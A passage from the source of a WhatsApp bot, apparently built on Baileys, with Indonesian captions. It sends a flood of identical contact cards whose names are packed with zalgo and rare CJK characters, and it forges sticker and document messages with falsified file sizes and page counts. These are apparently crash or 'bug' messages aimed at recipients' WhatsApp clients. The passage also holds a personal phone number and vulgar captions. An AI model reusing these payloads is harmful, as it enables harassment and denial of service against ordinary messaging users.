								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
						]
}, 'contactsArrayMessage', { quoted: mek, sendEphemeral: true })
hexa.sendMessage(from,'Nih Kak Owner Ku ><',text,{quoted: hehe})
break
case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await hexa.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:mek})
hexa.relayWAMessage(costick)
break
 case 'pdf':
  pdf = await hexa.prepareMessageFromContent(from, {				"documentMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Ap2No1Y0pwAHq2hzDZdtanuXaYGvhRvoHh9NG5slos3a.enc",
						"mimetype": "application/pdf",
						"title": "Skripsi Bab 9.pdf",
						"fileSha256": "HNpSyROmONrF3/l5AgyxKJQ45xKZ92AR8XahP/oQa4E=",
						"fileLength": "99999999990000",
						"pageCount": 299,
						"mediaKey": "4/+/JyAyc5yeJyoel92QRK7XmyhjavaG6Ak2OvZEzyQ=",
						"fileName": "Skripsi bab 9(hukum).pdf",
						"fileEncSha256": "w17Y3Rmcsyzxp9vEp/euHbSZHMQKn65QuKaYmHuEFVU=",
						"directPath": "/v/t62.7119-24/32798157_238518534914880_885550109527861164_n.enc?ccb=11-4&oh=e36712f3627bce33910d0ad9b93df9f9&oe=617A5000",
						"mediaKeyTimestamp": "1633000264",
						"jpegThumbnail": cecan
					}
  }, {quoted:mek, caption: 'kerjain tugas nya kntol'})
  hexa.relayWAMessage(pdf)
  break
 case 'doc':
  doc = hexa.prepareMessageFromContent(from, { 
					"documentMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AtKt0t2QRlLJ1_Mm7uxlGpnIQ_49wfhQXf-jhE14pxY8.enc",
						"mimetype": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
						"title": "Kontol.docx",
						"fileSha256": "cjQ3r0NdCeIvTiAEDdIQvBMUO7ElbEEaSj1mYMR+Rc0=",
						"fileLength": "9999999999900000",
						"pageCount": 289,
						"mediaKey": "ARX8JlaJQLgYG8juz4Nk1wIztSQtZhLDyc0tDNT9by8=",
						"fileName": "Kontol.docx",
						"fileEncSha256": "sPr5kdj3FNFRi1rtv3VgCxdLI0qsQBvHRwa0m/hVm2A=",
						"directPath": "/v/t62.7119-24/40950230_132266265804311_8103013172094058619_n.enc?ccb=11-4&oh=3c1b19ac261cd985db2992aa5387f308&oe=617B208C",
						"mediaKeyTimestamp": "1633004081"
     
     }
  }, {quoted:mek})
  hexa.relayWAMessage(doc)
  break
case 'sizeimg':
